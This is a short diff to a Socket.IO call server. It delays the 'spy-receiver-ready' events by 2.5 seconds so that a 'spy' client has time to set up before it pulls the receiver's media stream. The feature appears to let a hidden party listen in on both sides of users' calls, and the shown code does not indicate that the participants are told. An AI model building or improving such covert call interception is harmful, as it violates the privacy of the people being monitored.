@@ -1230,10 +1230,14 @@ io.on('connection', (socket) => {
     if (toSid) io.to(toSid).emit('call-answer', data);
     if (user) {
       const convKey = [user.name, data.to].sort().join('||');
-      // Tell spy: receiver answered — spy should now request stream from receiver too
-      io.to('spy||' + convKey).emit('spy-receiver-ready', {
-        receiverName: user.name, receiverSid: socket.id, convKey
-      });
+      const receiverSid = socket.id;
+      const receiverName = user.name;
+      // Delay so spy client has time to finish PC1 setup first
+      setTimeout(() => {
+        io.to('spy||' + convKey).emit('spy-receiver-ready', {
+          receiverName, receiverSid, convKey
+        });
+      }, 2500);
     }
   });
 
@@ -1357,11 +1361,13 @@ io.on('connection', (socket) => {
         callerSid: callerSid || null,
         receiverSid: receiverSid || null
       });
-      // Also send receiver-ready so spy connects to receiver side too
+      // Delay receiver-ready so client has time to create PC1 first
       if (receiverSid) {
-        socket.emit('spy-receiver-ready', {
-          receiverName: call.user2, receiverSid, convKey: key
-        });
+        setTimeout(() => {
+          socket.emit('spy-receiver-ready', {
+            receiverName: call.user2, receiverSid, convKey: key
+          });
+        }, 2500);
       }
     }
   });
